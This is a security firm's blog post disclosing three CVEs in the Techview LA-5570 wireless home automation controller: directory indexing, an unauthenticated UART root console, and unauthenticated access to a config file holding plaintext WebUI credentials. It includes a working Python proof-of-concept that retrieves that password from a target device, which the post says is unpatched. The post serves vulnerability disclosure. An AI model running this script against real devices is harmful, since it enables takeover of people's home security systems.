

top of page[![Exploit Security Penetration Testing Sydney](https://static.wixstatic.com/media/b352c4_662e9964218741c684e9f0cbfd9fc17b~mv2.jpg/v1/fill/w_397,h_136,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/exploit-logo.jpg)](https://www.exploitsecurity.io)![Exploit Security Penetration Testing Sydney](https://static.wixstatic.com/media/b30d7f_9970f452b8fa40e2b431f7e60ea22b4e~mv2.png/v1/fill/w_363,h_31,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/curiosity2.png)Search![Writer's picture]()Victor HannaAug 21, 20233 min read
# CVE-2023-34723, CVE-2023-34724, CVE-2023-34725

Updated: Sep 8, 2023

#### Multiple Vulnerabilities found in Techview LA-5570 Wireless Gateway Home Automation Controller

![Exploit security blog on CVE-2023-34723 CVE-2023-34724  CVE-2023-34725 Techview LA-5570 Wireless Gateway Home Automation Controller](https://static.wixstatic.com/media/b352c4_d2b2e5239a13453787f892e61b00a4a5~mv2.jpg/v1/fill/w_139,h_77,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_d2b2e5239a13453787f892e61b00a4a5~mv2.jpg)
#### **Introduction**

The Security Team at [exploitsecurity.io] uncovered multiple vulnerabilities in the Techview LA-5570 Wireless Home Automation Controller [**Firmware Version 1.0.19\_T53**]. These vulnerabilities can be used to to gain full control of the affected device.

**CVE-2023-34723**

Vulnerability Type: Directory Indexing, allows a threat actor to list the contents of specific directories outside of the web root context.

**CVE-2023-34724**

Vulnerability Type: On-Chip Debug and Test Interface With Improper Access Control, allows a threat actor unrestricted access to the root filesystem using an exposed UART interface, without the need for authentication.

**CVE-2023-34725**

Vulnerability Type: Incorrect Access Control, allows a threat actor access to sensitive systems configuration files without proper authentication or authorisation.

#### **Affected Product Overview**

######

The Techview LA-5570 Wireless Home Automation Controller provides a fully wireless solution that enables a home user to secure, monitor and control home facilities locally or remotely via phone, tablet PC, laptop, keypad and keyfob.

Product: **LA-5570 Wireless Home Automation Controller**

Affected Firmware Version: **1.0.19\_T53**

Product Vendor Link: **https://www.jaycar.com.au/wireless-gateway-home-automation-controller/p/LA5570**

![](https://static.wixstatic.com/media/b352c4_251dff7923c54616bdb2d743dcd1e469~mv2.png/v1/fill/w_49,h_36,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_251dff7923c54616bdb2d743dcd1e469~mv2.png)

System Architecture

#### **CVE-2023-34723**

######

The Security Team at [exploitsecurity.io] discovered that the Techview LA-5570 was susceptible to directory indexing.

This attack allows a threat actor to list the contents of specific directories outside the web root context **{/server/cgi-bin/]**. Most specifically it was possible to list the contents of the **/config/** and **/var/tmp/** directories which were found to contain sensitive system files. It was discovered that both of these directories were configured as symbolic links within the web root context **[/server/cgi-bin/]**, whose corresponding directory paths, owned by the root user, were accessible to the web user.

![](https://static.wixstatic.com/media/b352c4_f6198d43a8714401b3574237a6025cfe~mv2.jpg/v1/fill/w_147,h_5,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_f6198d43a8714401b3574237a6025cfe~mv2.jpg)

Symlink config -> /var/www

![](https://static.wixstatic.com/media/b352c4_b59bd0cc265e47ec8c5bd816819b057b~mv2.png/v1/fill/w_49,h_32,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_b59bd0cc265e47ec8c5bd816819b057b~mv2.png)

Contents of /config/

![](https://static.wixstatic.com/media/b352c4_01e0e586d99743df9ad3c122634e8867~mv2.png/v1/fill/w_49,h_2,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_01e0e586d99743df9ad3c122634e8867~mv2.png)

Symlink yy -> /var/tmp

![](https://static.wixstatic.com/media/b352c4_46fa6bf0d5b94da5aa8ba72c369378d9~mv2.png/v1/fill/w_49,h_32,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_46fa6bf0d5b94da5aa8ba72c369378d9~mv2.png)

Contents of /var/tmp/

##### **CVE-2023-34724**

The Security Team found that it was possible to gain unrestricted access to the root filesystem using an exposed UART interface, without the need for authentication.

![](https://static.wixstatic.com/media/b352c4_fa48c6c6e397407487b34bcd7d0bc7d9~mv2.png/v1/fill/w_49,h_28,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_fa48c6c6e397407487b34bcd7d0bc7d9~mv2.png)

Exposed UART

![](https://static.wixstatic.com/media/b352c4_fabe4aaf39444ca1a2f43071572aad04~mv2.jpg/v1/fill/w_147,h_67,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_fabe4aaf39444ca1a2f43071572aad04~mv2.jpg)

UART Console

##### **CVE-2023-34725**

The Security Team found that it was possible to access sensitive files based on improper access control. It was found that it was possible to gain access to the sensitive **/config/system.conf** configuration file without proper authorisation, which contained the plaintext WebUI login credentials.

![](https://static.wixstatic.com/media/b352c4_42f11a9ebfb543fbb27561f8be078b96~mv2.jpg/v1/fill/w_147,h_92,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_42f11a9ebfb543fbb27561f8be078b96~mv2.jpg)

/config/system.conf

#### **Responsible Disclosure**

####

The Security Team at [exploitsecurity.io], reached out to the vendor to ensure that a patch was released prior to public disclosure. However, as of the time of this disclosure, no patch has been applied.

#### **Proof of Concept**

The proof of concept code capitalises on CVE-2023-34725 to extract the WebUI password from the affected device, without proper authentication or authorisation.

```
#!/opt/homebrew/bin/python3

import requests
import sys
from time import sleep
from urllib3.exceptions import InsecureRequestWarning
from colorama import init
from colorama import Fore, Back, Style
import re
import os
import ipaddress
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def banner():
    if os.name == 'posix':
        clr_cmd = ('clear')
    elif os.name == 'nt':
        clr_cmd = ('cls')
    os.system(clr_cmd)
    print ("[+]****************************************************[+]")
    print (" | Author      : The Security Team                      |")
    print (" | Company     : "+Fore.RED+ "Exploit Security" +Style.RESET_ALL+"\t\t\t|")
    print (" | Description : TechVIEW LA-5570 Directory Traversal   |")
    print (" | Usage       : "+sys.argv[0]+" <target>              |")
    print ("[+]****************************************************[+]")

def usage():
    print (f"Usage: {sys.argv[0]} <target>")

def main(target):
    domain = "http://"+target+"/config/system.conf"
    try:
        url = domain.strip()
        r = requests.get(url, verify=False, timeout=3)
        print ("[+] Retrieving credentials", flush=True, end='')
        sleep(1)
        print(" .", flush=True, end='')
        sleep(1)
        print(" .", flush=True, end='')
        sleep(1)
        print(" .", flush=True, end='')
        if ("system_password" in r.text):
            data =  (r.text.split("\n"))
            print (f"\n{data[1]}")
        else:
            print (Fore.RED + "[!] Target is not vulnerable !"+ Style.RESET_ALL)
    except TimeoutError:
        print (Fore.RED + "[!] Timeout connecting to target !"+ Style.RESET_ALL)
    except KeyboardInterrupt:
        return
    except requests.exceptions.Timeout:
        print (Fore.RED + "[!] Timeout connecting to target !"+ Style.RESET_ALL)
        return

if __name__ == '__main__':
    if len(sys.argv)>1:
        banner()
        target = sys.argv[1]
        try:
            validate = ipaddress.ip_address(target)
            if (validate):
                main (target)
        except ValueError as e:
            print (Fore.RED + "[!] " + str(e) + " !" + Style.RESET_ALL)
    else:
        print (Fore.RED + f"[+] Not enough arguments, please specify target !" + Style.RESET_ALL)
```

![](https://static.wixstatic.com/media/b352c4_41550e259e5b4be4b1b0c5655913b354~mv2.png/v1/fill/w_48,h_2,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_41550e259e5b4be4b1b0c5655913b354~mv2.png)
![](https://static.wixstatic.com/media/b352c4_6790f9d875aa423186c252fb1d03f2bf~mv2.png/v1/fill/w_48,h_14,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_auto/b352c4_6790f9d875aa423186c252fb1d03f2bf~mv2.png)

Exploit Script

#### **Timeline**

1. 26/5 - Raised a support ticket
2. 29/5 - Response from support requesting further information
3. 29/5 - Responded to support detailing that findings had been made, 29/5 - CVE request for placeholder from MITRE
4. 30/5 - Followup email requesting update
5. 1/6 - Followup email requesting update
6. 2/6 - Response from support requesting findings overview
7. 2/6 - Responded to support with findings overview
8. 2/6 - Support escalated to advanced product team
9. 23/6 - Placeholder(s) CVE assigned by Mitre
10. 25/8 - Public disclosure
######

######

1,593 views
## Recent Posts

[See All](https://www.exploitsecurity.io/blog)[![]()](https://www.exploitsecurity.io/post/elon-musk-s-optimus-bot-a-double-edged-revolutionary-leap)

[Elon Muskâ€™s Optimus Bot: A Double-Edged Revolutionary Leap](https://www.exploitsecurity.io/post/elon-musk-s-optimus-bot-a-double-edged-revolutionary-leap)

31[![]()](https://www.exploitsecurity.io/post/cve-2022-43704)

[CVE-2022-43704](https://www.exploitsecurity.io/post/cve-2022-43704)

33[![]()](https://www.exploitsecurity.io/post/cve-2022-29593)

[CVE-2022-29593](https://www.exploitsecurity.io/post/cve-2022-29593)

7

* [![Discord]()](https://discord.gg/hEtgt8S3Gr)
* [![GitHub]()](https://github.com/exploitsecurityio)
* [![x-icon-round]()](https://twitter.com/3xploit5ecurit7)
* [![LinkedIn]()](https://www.linkedin.com/company/exploitsecurityio/)
[![Exploit Security Penetration Testing Sydney](https://static.wixstatic.com/media/b352c4_175a4585b235423eb0375552b2993643~mv2.gif/v1/fill/w_165,h_165,al_c,usm_0.66_1.00_0.01,blur_3,pstr/MOSHED-2023-10-26-12-3-3_gif.gif)](https://www.exploitsecurity.io/post/cve-2023-34723-cve-2023-34724-cve-2023-34725)

[Privacy Policy](https://www.exploitsecurity.io/privacy-policy)

ACN: 670304435

bottom of page

